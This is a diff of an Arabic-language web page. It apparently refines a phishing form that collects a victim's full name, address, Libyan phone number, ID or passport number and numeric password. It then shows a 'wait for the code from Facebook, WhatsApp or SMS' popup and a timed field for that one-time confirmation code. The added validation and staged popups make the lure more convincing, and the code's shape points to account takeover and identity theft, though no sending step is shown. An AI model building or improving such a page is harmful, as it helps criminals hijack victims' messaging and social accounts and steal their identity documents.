@@ -23,6 +23,7 @@
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
       width: 90%;
       max-width: 320px;
+      position: relative;
     }
 
     .logo {
@@ -95,7 +96,7 @@
     button {
       width: 100%;
       padding: 12px;
-      background-color: #2e7d32; /* أخضر */
+      background-color: #2e7d32;
       color: #fff;
       border: none;
       border-radius: 6px;
@@ -105,9 +106,9 @@
       margin-top: 20px;
     }
 
-    .code-popup {
+    .code-popup,
+    .overlay-popup {
       position: fixed;
-      bottom: 15px;
       left: 10px;
       right: 10px;
       background: #fff;
@@ -116,15 +117,28 @@
       padding: 14px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       display: none;
+      z-index: 100;
     }
 
-    .code-popup h4 {
+    .overlay-popup {
+      bottom: 15px;
+      z-index: 101;
+    }
+
+    .code-popup {
+      bottom: 80px;
+      z-index: 102;
+    }
+
+    .code-popup h4,
+    .overlay-popup h4 {
       margin: 0 0 8px;
       color: #002147;
       font-size: 15px;
     }
 
-    .code-popup input {
+    .code-popup input,
+    .overlay-popup input {
       width: 100%;
       padding: 10px;
       font-size: 14px;
@@ -143,6 +157,7 @@
       color: red;
       font-size: 12px;
       display: none;
+      text-align: center;
     }
 
     @media (max-width: 400px) {
@@ -177,7 +192,15 @@
         </div>
       </div>
       <div class="form-group">
-        <label for="idNumber">رقم الجواز أو البطاقة</label>
+        <label for="documentType">نوع الوثيقة</label>
+        <select id="documentType" name="documentType" required>
+          <option value="">-- اختر نوع الوثيقة --</option>
+          <option value="passport">جواز سفر</option>
+          <option value="idcard">بطاقة شخصية</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="idNumber">رقم الوثيقة</label>
         <input type="text" id="idNumber" name="idNumber" required>
       </div>
       <div class="form-group">
@@ -188,13 +211,17 @@
         <label for="password">الرقم السري</label>
         <input type="password" id="password" name="password" minlength="6" required>
       </div>
-      <div style="height: 14px;"></div>
+      <div class="error" id="validationError">يرجى التأكد من صحة البيانات.</div>
       <button type="submit">إرسال البيانات</button>
     </form>
   </div>
 
+  <div class="overlay-popup" id="waitPopup">
+    <h4>يرجى انتظار استلام الكود من فيسبوك أو واتساب أو SMS</h4>
+  </div>
+
   <div class="code-popup" id="codePopup">
-    <h4>أدخل كود التأكيد من فيسبوك أو واتساب</h4>
+    <h4>أدخل كود التأكيد</h4>
     <input type="text" id="verificationCode" maxlength="8" placeholder="كود من 6-8 حروف أو أرقام">
     <div class="countdown" id="countdown">08:00</div>
     <div class="error" id="codeError">يرجى إدخال كود صحيح من 6 إلى 8 خانات.</div>
@@ -204,8 +231,33 @@
   <script>
     document.getElementById("registrationForm").addEventListener("submit", function(e) {
       e.preventDefault();
-      document.querySelectorAll("#registrationForm input").forEach(input => input.disabled = true);
-      document.getElementById("codePopup").style.display = "block";
+      const fullName = document.getElementById("fullName").value.trim();
+      const address = document.getElementById("address").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const documentType = document.getElementById("documentType").value;
+      const errorEl = document.getElementById("validationError");
+
+      const nameRegex = /^[\u0600-\u06FF\s]{8,33}$/;
+      const addressRegex = /^[\u0600-\u06FF\s]{3,22}$/;
+      const phoneRegex = /^\+2189\d{7}$/;
+      const passwordRegex = /^\d{6,15}$/;
+
+      if (!nameRegex.test(fullName) ||
+          !addressRegex.test(address) ||
+          !phoneRegex.test(phone) ||
+          !passwordRegex.test(password) ||
+          !documentType) {
+        errorEl.style.display = "block";
+        return;
+      }
+
+      errorEl.style.display = "none";
+      document.querySelectorAll("#registrationForm input, #registrationForm select").forEach(input => input.disabled = true);
+      document.getElementById("waitPopup").style.display = "block";
+      setTimeout(() => {
+        document.getElementById("codePopup").style.display = "block";
+      }, 1000);
       startCountdown();
     });
 
